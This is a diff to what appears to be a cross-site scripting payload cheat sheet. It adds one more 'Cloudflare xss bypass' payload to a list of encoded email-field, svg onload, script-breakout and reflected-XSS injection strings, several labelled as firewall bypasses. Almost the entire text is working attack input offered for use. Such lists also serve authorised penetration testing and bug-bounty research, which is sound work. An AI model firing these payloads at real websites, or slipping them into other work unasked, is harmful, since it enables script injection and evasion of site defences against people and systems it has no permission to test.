@@ -27,6 +27,7 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E                              --> Best Email XSX
 test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E      --> Double Encoding the uppper payload
 "><Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))>        --> Cloudflare xss bypass 
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>              --> Cloudflare xss bypass 
 https://xxx.com/path/"><script>alert(1)</script>                                   --> Sometime do add additional parameters like path in this sense and then payload forreflected XSS
 abc`;return false});});alert`xss`;</script>                                        --> For reflected XSS
 abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E              --> For reflected XSS
